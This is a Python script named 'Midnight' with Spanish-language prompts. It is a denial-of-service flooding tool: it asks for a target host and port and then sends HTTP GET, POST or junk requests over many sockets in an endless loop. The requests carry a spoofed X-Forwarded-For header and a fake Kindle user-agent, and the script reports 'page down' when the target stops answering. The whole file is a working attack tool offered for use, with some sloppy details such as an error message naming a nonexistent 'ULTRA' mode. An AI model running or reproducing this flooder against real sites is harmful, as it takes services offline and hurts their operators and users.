import socket
import sys
import time
import os
import pyfiglet
from termcolor import colored
from colorama import init, Fore, Back, Style

def send_http_packets(host, port, num_sockets, message, msg_len, protocol):
    sent_packets = 0
    while True:
        for i in range(num_sockets):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((host, port))
                s.sendall(message[:msg_len])
                sent_packets += 1
            except socket.error as e:
                print(Fore.RED+str(f"[+] Pagina Caida! Error: {e}"))
            finally:
                s.close()
        
        print(Fore.WHITE+str(f"[+] Socket de Tipo {protocol} enviados: {sent_packets}, Enviando..."))
        time.sleep(1)

if __name__ == '__main__':
    os.system("clear")
    ascii_text = pyfiglet.figlet_format("Midnight")
    print(colored(ascii_text, 'green'))
    print(Fore.GREEN+str("Created By Santh'M w/ Genplat, Official Version v1.0"))
    host = input(Fore.GREEN+str("[+] Ingrese la dirección del host (URL o IP): "))
    port = int(input(Fore.GREEN+str("[+] Ingrese el puerto: ")))
    
    num_sockets = int(input(Fore.GREEN+str("[+] Ingrese la cantidad de sockets a enviar: ")))
    
    protocol = input("Ingrese el protocolo a utilizar (GET, POST, CRASH o SECRET): ").upper()
if protocol == "GET":
    message = b'GET / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
elif protocol == "POST":
    message = b'POST / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
elif protocol == "CRASH":
    message = b'"*"*5500\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
elif protocol == "SECRET":
    message = b'GET / HTTP/1.0 / POST / HTTP/1.0 / "*"*5500\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+\r\nX-FORWARDED-FOR: 199.188.205.235\r\n\r\n'
else:
    print("Protocolo inválido. Debe ser GET, POST, CRASH O ULTRA.")
    sys.exit()

msg_len = int(input(Fore.GREEN+str("[+] Ingrese la cantidad de bytes a enviar en el mensaje: ")))

print("[+] Cargando paquetes...")

send_http_packets(host, port, num_sockets, message, msg_len, protocol)
